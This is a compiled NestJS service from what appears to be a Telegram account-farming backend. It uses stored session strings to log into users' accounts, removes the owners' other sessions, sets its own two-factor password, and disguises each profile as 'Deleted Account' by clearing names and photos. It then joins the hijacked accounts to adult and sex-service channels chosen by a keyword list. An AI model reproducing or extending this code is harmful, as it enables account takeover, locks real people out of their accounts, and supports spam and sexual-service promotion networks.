"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.BufferClientService = void 0;
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const Telegram_service_1 = require("../Telegram/Telegram.service");
const Helpers_1 = require("telegram/Helpers");
const users_service_1 = require("../users/users.service");
const activechannels_service_1 = require("../activechannels/activechannels.service");
const utils_1 = require("../../utils");
const client_service_1 = require("../clients/client.service");
let BufferClientService = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }
    async findAll() {
        return this.bufferClientModel.find().exec();
    }
    async findOne(mobile) {
        const user = await this.bufferClientModel.findOne({ mobile }).exec();
        if (!user) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async updatedocs() {
        console.log("here");
        const clients = await this.findAll();
        console.log(clients.length);
        for (const client of clients) {
            const data = { ...client };
            await this.telegramService.createClient(client.mobile);
            const channelinfo = await this.telegramService.getChannelInfo(client.mobile, true);
            await this.bufferClientModel.findByIdAndUpdate(client._id, { channels: channelinfo.ids.length, createdDate: (new Date(Date.now())).toISOString().split('T')[0] });
        }
    }
    async update(mobile, user) {
        const updatedData = { ...user };
        delete updatedData['_id'];
        console.log({ ...updatedData });
        const existingUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { updatedData }, { new: true, upsert: true }).exec();
        if (!existingUser) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return existingUser;
    }
    async remove(mobile) {
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            return await this.bufferClientModel.find(query).exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async joinchannelForBufferClients() {
        await this.telegramService.disconnectAll();
        await (0, Helpers_1.sleep)(2000);
        const clients = await this.bufferClientModel.find({ channels: { "$lt": 180 } }).limit(4);
        for (const document of clients) {
            try {
                const client = await this.telegramService.createClient(document.mobile, false, false);
                const channels = await client.channelInfo(true);
                const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'coupl', 'cpl', 'randi', 'bhab', 'boy', 'girl', 'friend', 'frnd', 'boob', 'pussy', 'dating', 'swap', 'gay', 'sex', 'bitch', 'love', 'video', 'service', 'real', 'call', 'desi'];
                const result = await this.activeChannelsService.getActiveChannels(150, 0, keys, channels.ids);
                console.log("DbChannelsLen: ", result.length);
                let resp = '';
                for (const channel of result) {
                    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
                }
                client.joinChannels(resp);
            }
            catch (error) {
                console.log(error);
            }
        }
    }
    async setAsBufferClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const clients = await this.clientService.findAll();
        const clientIds = clients.map(client => client.mobile);
        if (!clientIds.includes(mobile)) {
            const telegramClient = await this.telegramService.createClient(mobile);
            try {
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                await this.telegramService.deleteClient(mobile);
                const bufferClient = {
                    tgId: user.tgId,
                    session: user.session,
                    mobile: user.mobile,
                    createdDate: (new Date(Date.now())).toISOString().split('T')[0],
                    availableDate,
                    channels: channels.ids.length,
                    updatedDate: (new Date(Date.now())).toISOString().split('T')[0]
                };
                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
                return "Client set as buffer successfully";
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkBufferClients() {
        await this.telegramService.disconnectAll();
        await (0, Helpers_1.sleep)(2000);
        const clients = await this.findAll();
        const goodIds = [];
        const badIds = [];
        if (clients.length < 40) {
            for (let i = 0; i < 40 - clients.length; i++) {
                badIds.push(1);
            }
        }
        for (const document of clients) {
            console.log(document);
            try {
                const cli = await this.telegramService.createClient(document.mobile);
                const hasPassword = await cli.hasPassword();
                if (!hasPassword) {
                    badIds.push(document.mobile);
                    await this.remove(document.mobile);
                }
                else {
                    const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);
                    await this.bufferClientModel.findByIdAndUpdate(document._id, { channels: channelinfo.ids.length, updatedDate: (new Date(Date.now())).toISOString().split('T')[0] });
                    console.log(document.mobile, " :  ALL Good");
                    goodIds.push(document.mobile);
                }
                await this.telegramService.deleteClient(document.mobile);
                await (0, Helpers_1.sleep)(2000);
            }
            catch (error) {
                console.log(document.mobile, " :  false");
                badIds.push(document.mobile);
                await this.telegramService.deleteClient(document.mobile);
            }
        }
        console.log(badIds, goodIds);
        this.addNewUserstoBufferClients(badIds, goodIds);
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: { $exists: false } }, { lastActive: 1 }, badIds.length + 3);
        console.log("documents : ", documents.length);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true);
                        console.log("Inserting Document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            createdDate: (new Date(Date.now())).toISOString().split('T')[0],
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                            updatedDate: (new Date(Date.now())).toISOString().split('T')[0],
                        };
                        await this.create(bufferClient);
                        console.log("=============Created BufferClient=============");
                        await this.telegramService.deleteClient(document.mobile);
                        badIds.pop();
                    }
                    else {
                        console.log("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                catch (error) {
                    console.log(error);
                    await this.telegramService.deleteClient(document.mobile);
                }
            }
            catch (error) {
                console.error("An error occurred:", error);
            }
        }
        setTimeout(() => {
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => activechannels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        activechannels_service_1.ActiveChannelsService,
        client_service_1.ClientService])
], BufferClientService);
//# sourceMappingURL=buffer-client.service.js.map